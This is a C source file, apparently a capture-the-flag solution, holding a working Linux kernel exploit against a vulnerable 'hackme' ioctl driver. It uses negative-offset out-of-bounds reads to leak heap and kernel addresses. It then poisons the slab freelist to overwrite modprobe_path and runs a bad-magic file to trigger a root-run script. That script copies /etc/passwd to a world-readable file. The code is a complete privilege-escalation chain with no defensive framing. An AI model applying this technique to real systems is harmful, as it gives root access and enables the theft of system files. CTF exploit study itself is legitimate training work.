#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>

void show_char_array_hex(char * p_data, int len) {
    if(len <=0) {
        len = strlen(p_data);
    }
    for(int i = 0; i < len;i++) {
        printf("%02x", p_data[i]);
    }
    printf("\n");
}


int add_seq_operations_0x20() {
    char buf[123];

    int victim = open("/proc/self/stat", O_RDONLY);
    read(victim, buf, 1); // call start 
    
    return 0;
}

#define __int8 char
#define __int16 short
#define __int32 int
#define __int64 long long

struct Node
{
  unsigned int index;
  char *p_user_data;
  unsigned __int64 data_len;
  __int64 rw_start_index;
};

#define IOTCL_ADD 0x30000
#define IOTCL_REMOVE 0x30001
#define IOTCL_WRITE 0x30002
#define IOTCL_READ 0x30003

int G_IOCTL_FD = 0;

void add_node(int index, char *p_user_data, int data_len, int rw_start_index) {
    struct Node request;

    request.index = index;
    request.p_user_data = p_user_data;
    request.data_len = data_len;
    request.rw_start_index = rw_start_index;
    if (ioctl(G_IOCTL_FD, IOTCL_ADD, &request) != 0) {
        perror("IOCTL ?");
    }

}

void remove_node(int index) {

    struct Node request;

    request.index = index;

    if (ioctl(G_IOCTL_FD, IOTCL_REMOVE, &request) != 0) {
        perror("IOCTL ?");
    }
}

/* debug
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffffc0000000+0x122' -ex='add-symbol-file ./hackme.ko 0xffffffffc0000000'
*/

int main(int argc, char **argv[]) {
    char modprobe_path[40] = "/home/pwn/nirugiri.sh\0";
    char data_0x20_const[40] = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    char data_0x20[40] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";


    long * leak_pointer = (long*)data_0x20;;

    struct Node read_request;
    read_request.index = 2;
    read_request.p_user_data = data_0x20;
    read_request.data_len = 0x20;
    read_request.rw_start_index = -0x20;

    printf("[+] start poc\n");

    G_IOCTL_FD = open("/dev/hackme", O_RDONLY);
    if (G_IOCTL_FD == -1 ) {
        perror("open fd?");
        return -1;
    }
    //leak kernel base
    add_node(0, data_0x20, 0x20, 0);
    add_node(1, data_0x20, 0x20, 0);
    add_node(2, data_0x20, 0x20, 0);
    remove_node(1);
    ioctl(G_IOCTL_FD, IOTCL_READ, &read_request);
    long heap_leak = (*leak_pointer);
    add_seq_operations_0x20();

    ioctl(G_IOCTL_FD, IOTCL_READ, &read_request);
    long kernel_base = (*leak_pointer) & 0xfffffffffff00000;
    printf("[+] kernel base %lx\n", kernel_base);
    printf("[+] heap leak %lx\n", heap_leak);
    //show_char_array_hex(data_0x20, 0x20);


    long mod_prob = 8649056 + kernel_base;
    printf("[+] mod_prob %lx\n", mod_prob);
    add_node(3, data_0x20_const, 0x20, 0);
    add_node(4, data_0x20_const, 0x20, 0);
    add_node(5, data_0x20_const, 0x20, 0);
    add_node(6, data_0x20_const, 0x20, 0);
    add_node(7, data_0x20_const, 0x20, 0);
    remove_node(6);
    
    read_request.index = 7;
    read_request.p_user_data = &mod_prob;
    read_request.data_len = 0x20;
    read_request.rw_start_index = -0x20;
    ioctl(G_IOCTL_FD, IOTCL_WRITE, &read_request);


    /*debug
    b * 0xffffffffc0000000+0x143
    */
    add_node(8, data_0x20_const, 0x20, 0);
    add_node(9, modprobe_path, 0x20, 0);     //写入mode_prob
    
    //最后记得恢复一下现场，否则下次分配0x20时会出现kernel-panic，b
    //当然不用完全恢复，释放几个保证0x20堆块有可用的坚持到我们脚本结束就行
    remove_node(3);
    remove_node(4);
    remove_node(5);

    // trigger modprobe_path
    printf("[+] get the flag\n");
    system("echo -ne '#!/bin/sh\n/bin/cp /etc/passwd /home/pwn/flag.txt\n/bin/chmod 777 /home/pwn/flag.txt' > /home/pwn/nirugiri.sh");
    system("chmod +x /home/pwn/nirugiri.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/puipui-molcar");
    system("chmod +x /home/pwn/puipui-molcar");
    system("/home/pwn/puipui-molcar");
    system("cat /home/pwn/flag.txt");
    printf("[+] THE END");

    getchar();

    return 0;
}